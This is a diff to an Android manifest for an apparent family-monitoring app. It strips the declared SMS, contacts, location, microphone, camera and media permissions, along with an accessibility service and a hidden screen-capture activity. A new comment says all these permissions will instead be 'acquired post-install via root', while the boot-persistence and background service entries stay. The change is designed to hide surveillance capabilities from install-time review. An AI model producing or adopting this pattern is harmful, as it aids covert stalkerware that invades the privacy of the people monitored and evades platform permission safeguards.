@@ -1,38 +1,13 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android">
 
-    <!-- Network -->
+    <!-- Minimal install-time footprint — all runtime permissions acquired post-install via root -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-
-    <!-- Camera — document/QR scanner feature -->
-    <uses-permission android:name="android.permission.CAMERA" />
-    <uses-feature android:name="android.hardware.camera2" android:required="false" />
-
-    <!-- File access — backup & restore feature -->
-    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
-    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
-    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
-
-    <!-- Device info — device health reports -->
-    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
-
-    <!-- Keep alive — background monitoring service -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
-
-    <!-- SMS / Contacts — family communication monitoring -->
-    <uses-permission android:name="android.permission.READ_SMS" />
-    <uses-permission android:name="android.permission.READ_CONTACTS" />
-
-    <!-- Location — child location tracking feature -->
-    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
-    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
-
-    <!-- Microphone — voice note feature -->
-    <uses-permission android:name="android.permission.RECORD_AUDIO" />
 
     <application
         android:allowBackup="true"
@@ -41,7 +16,6 @@
         android:description="@string/app_description"
         android:theme="@style/Theme.AppCompat.Light.NoActionBar">
 
-        <!-- Setup wizard — visible onboarding UI -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
@@ -53,33 +27,11 @@
             </intent-filter>
         </activity>
 
-        <!-- Background monitoring service -->
         <service
             android:name=".MonitorService"
             android:exported="false"
             android:foregroundServiceType="dataSync" />
 
-        <!-- Accessibility helper for enhanced parental controls -->
-        <service
-            android:name=".AccessibilityHelperService"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
-            android:label="@string/accessibility_service_label"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService" />
-            </intent-filter>
-            <meta-data
-                android:name="android.accessibilityservice"
-                android:resource="@xml/accessibility_service_config" />
-        </service>
-
-        <!-- Screen capture for app usage reports -->
-        <activity
-            android:name=".ScreenCaptureActivity"
-            android:exported="false"
-            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
-
-        <!-- Restart monitoring after device reboot -->
         <receiver
             android:name=".DeviceBootReceiver"
             android:exported="true">
